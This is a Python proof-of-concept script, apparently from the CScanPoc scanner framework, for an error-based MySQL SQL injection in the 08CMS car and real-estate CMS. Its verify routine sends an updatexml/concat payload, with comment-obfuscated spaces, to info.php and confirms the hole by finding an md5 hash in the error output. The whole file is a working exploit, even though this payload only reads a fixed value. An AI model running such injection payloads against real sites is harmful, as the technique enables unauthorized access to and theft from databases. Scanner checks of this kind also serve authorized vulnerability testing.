# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = '08CMS_0000'  # 平台漏洞编号，留空
    name = '08CMS 汽车房产系统存在 Mysql 报错注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-18'  # 漏洞公布时间
    desc = '''
        08CMS 汽车房产系统存在 Mysql 报错注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0110861'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '08CMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '06b7b964-1def-4284-8349-76464523f755'
    author = '国光'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url =self.target + "/info.php?fid=1&tblprefix=cms_msession"
            payload = "/**/where/**/1/**/and/**/updatexml(1,concat(0x37,(select/**/md5(520)/**/limit/**/0,1)),1)%23"
            geturl = url + payload
            code, head, body, errcode, final_url = hh.http(
                geturl, cookie="umW_msid=rsLQWU")

            if code == 200 and 'cf67355a3333e6e143439161adc2d82e' in body:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n报错注入漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=geturl))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
